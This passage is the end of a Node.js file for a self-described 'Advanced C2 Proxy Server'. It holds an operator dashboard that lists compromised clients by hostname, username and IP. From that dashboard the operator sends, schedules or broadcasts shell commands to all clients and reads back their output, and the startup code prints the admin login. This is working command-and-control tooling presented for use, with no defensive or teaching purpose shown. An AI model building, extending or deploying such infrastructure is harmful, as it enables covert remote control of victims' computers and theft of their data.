        const listEl = document.getElementById('clientList');
        listEl.innerHTML = '<span class="loading">⏳ Loading clients...</span>';
        
        if (!authToken) {
            listEl.innerHTML = '🔑 Please login first';
            return;
        }
        
        fetch(API_BASE + '/api/admin/clients', { headers: getHeaders() })
            .then(res => res.json())
            .then(data => {
                if (data.error) {
                    listEl.innerHTML = '<span class="error">❌ ' + data.error + '</span>';
                    return;
                }
                
                if (!data.clients || data.clients.length === 0) {
                    listEl.innerHTML = 'No clients connected yet.';
                    return;
                }
                
                listEl.innerHTML = '';
                data.clients.forEach(client => {
                    const card = document.createElement('div');
                    card.className = 'client-card';
                    const lastSeen = new Date(client.lastSeen);
                    const isOnline = (Date.now() - lastSeen.getTime()) < 300000;
                    card.innerHTML = \`
                        <div class="id">\${client.clientId}</div>
                        <div class="detail">💻 \${client.hostname}</div>
                        <div class="detail">👤 \${client.username}</div>
                        <div class="detail">📡 \${client.ip || 'unknown'}</div>
                        <div class="detail">🕐 Last seen: \${lastSeen.toLocaleString()}</div>
                        <span class="status \${isOnline ? 'online' : 'offline'}">\${isOnline ? '🟢 Online' : '🔴 Offline'}</span>
                        <div class="detail" style="font-size:11px; margin-top:5px;">
                            📊 \${client.resultsCount || 0} results | 
                            ⏳ \${client.pendingCommands || 0} pending
                        </div>
                    \`;
                    card.onclick = () => {
                        selectedClient = client.clientId;
                        document.getElementById('targetClient').value = client.clientId;
                        loadResults(client.clientId);
                        loadHistory(client.clientId);
                    };
                    listEl.appendChild(card);
                });
            })
            .catch(err => {
                listEl.innerHTML = '<span class="error">❌ ' + err.message + '</span>';
            });
    }
    
    function loadAnalytics() {
        if (!authToken) return;
        
        fetch(API_BASE + '/api/admin/analytics', { headers: getHeaders() })
            .then(res => res.json())
            .then(data => {
                if (data.stats) {
                    document.getElementById('statTotal').textContent = data.stats.total || 0;
                    document.getElementById('statOnline').textContent = data.stats.online || 0;
                    document.getElementById('statOffline').textContent = data.stats.offline || 0;
                }
                if (data.metrics) {
                    document.getElementById('statCommands').textContent = data.metrics.commandExecutions || 0;
                }
            })
            .catch(err => {
                console.error('Analytics error:', err);
            });
    }
    
    function sendCommand() {
        const clientId = document.getElementById('targetClient').value.trim();
        const command = document.getElementById('commandInput').value.trim();
        const scheduleTime = document.getElementById('scheduleTime').value;
        
        if (!command) {
            alert('Please enter a command');
            return;
        }
        if (!clientId) {
            alert('Please enter a Client ID');
            return;
        }
        if (!authToken) {
            alert('Please login first');
            return;
        }
        
        document.getElementById('commandStatus').innerHTML = '⏳ Sending command...';
        
        const payload = { clientId, command };
        if (scheduleTime) {
            payload.scheduled = scheduleTime;
        }
        
        fetch(API_BASE + '/api/admin/command', {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(data => {
            if (data.error) {
                document.getElementById('commandStatus').innerHTML = '❌ ' + data.error;
            } else {
                document.getElementById('commandStatus').innerHTML = \`
                    ✅ Command sent! ID: \${data.commandId} 
                    \${data.scheduled ? '📅 Scheduled' : ''}
                \`;
                document.getElementById('commandInput').value = '';
                if (!data.scheduled) {
                    setTimeout(() => loadResults(clientId), 3000);
                }
            }
        })
        .catch(err => {
            document.getElementById('commandStatus').innerHTML = '❌ ' + err.message;
        });
    }
    
    function broadcastCommand() {
        const command = document.getElementById('commandInput').value.trim();
        if (!command) {
            alert('Please enter a command');
            return;
        }
        if (!authToken) {
            alert('Please login first');
            return;
        }
        
        if (!confirm('Send this command to ALL connected clients?')) return;
        
        document.getElementById('commandStatus').innerHTML = '⏳ Broadcasting...';
        
        fetch(API_BASE + '/api/admin/broadcast', {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({ command })
        })
        .then(res => res.json())
        .then(data => {
            if (data.error) {
                document.getElementById('commandStatus').innerHTML = '❌ ' + data.error;
            } else {
                document.getElementById('commandStatus').innerHTML = \`
                    ✅ Broadcasted to \${data.broadcasted} clients
                \`;
                document.getElementById('commandInput').value = '';
            }
        })
        .catch(err => {
            document.getElementById('commandStatus').innerHTML = '❌ ' + err.message;
        });
    }
    
    function loadResults(clientId) {
        const outputEl = document.getElementById('commandOutput');
        outputEl.innerHTML = '⏳ Loading results...';
        
        if (!authToken) {
            outputEl.innerHTML = '🔑 Please login first';
            return;
        }
        
        fetch(API_BASE + '/api/admin/results/' + clientId, { headers: getHeaders() })
            .then(res => res.json())
            .then(data => {
                if (data.error) {
                    outputEl.innerHTML = '❌ ' + data.error;
                    return;
                }
                if (!data.results || data.results.length === 0) {
                    outputEl.innerHTML = 'No results for this client.';
                    return;
                }
                let html = '';
                data.results.slice().reverse().forEach(result => {
                    html += \`[\${result.timestamp}] \${result.commandId || 'unknown'}\n\`;
                    html += \`\${result.output || 'No output'}\n\`;
                    html += '─'.repeat(60) + '\n\n';
                });
                outputEl.innerHTML = html;
            })
            .catch(err => {
                outputEl.innerHTML = '❌ ' + err.message;
            });
    }
    
    function loadHistory(clientId) {
        const historyEl = document.getElementById('commandHistory');
        historyEl.innerHTML = '⏳ Loading history...';
        
        // Simplified history view
        fetch(API_BASE + '/api/admin/clients/' + clientId, { headers: getHeaders() })
            .then(res => res.json())
            .then(data => {
                if (data.error || !data.history) {
                    historyEl.innerHTML = 'No history available.';
                    return;
                }
                let html = '';
                data.history.slice().reverse().forEach(entry => {
                    html += \`<div class="command-entry">\`;
                    html += \`<span class="cmd">📌 \${entry.command}</span>\`;
                    html += \`<span class="time">\${new Date(entry.timestamp).toLocaleString()}</span>\`;
                    html += \`<span style="font-size:11px; color:#8899aa;"> [\${entry.status}]\` + 
                           \`</span></div>\`;
                });
                historyEl.innerHTML = html || 'No history yet.';
            })
            .catch(() => {
                historyEl.innerHTML = 'Failed to load history.';
            });
    }
    
    // Auto-refresh
    setInterval(() => {
        if (authToken) {
            loadClients();
            loadAnalytics();
        }
    }, 30000);
    
    // Initial load
    console.log('🚀 Dashboard loaded');
</script>
</body>
</html>
    `);
});

// ==================== START SERVER ====================

server.listen(PORT, '0.0.0.0', async () => {
    console.log('🚀 Advanced C2 Proxy Server v3.0.0');
    console.log('📡 Running on Render.com');
    console.log(`🔐 Encryption: AES-256-GCM`);
    console.log(`💾 Storage: In-Memory + Disk Persistence`);
    console.log(`🌐 WebSocket: ws://localhost:${PORT}`);
    console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);
    console.log('');
    console.log('🔑 Admin Login:');
    console.log(`   Username: ${ADMIN_USERNAME}`);
    console.log(`   Password: ${ADMIN_PASSWORD}`);
    console.log('');
    console.log('📋 To get admin token, login via dashboard or use:');
    console.log('   POST /api/admin/login');
    console.log('   { "username": "' + ADMIN_USERNAME + '", "password": "' + ADMIN_PASSWORD + '" }');
});

// ==================== ERROR HANDLING ====================

process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err.message);
    console.error(err.stack);
});

process.on('unhandledRejection', (err) => {
    console.error('❌ Unhandled Rejection:', err.message);
});

console.log('✅ Server initialization complete');
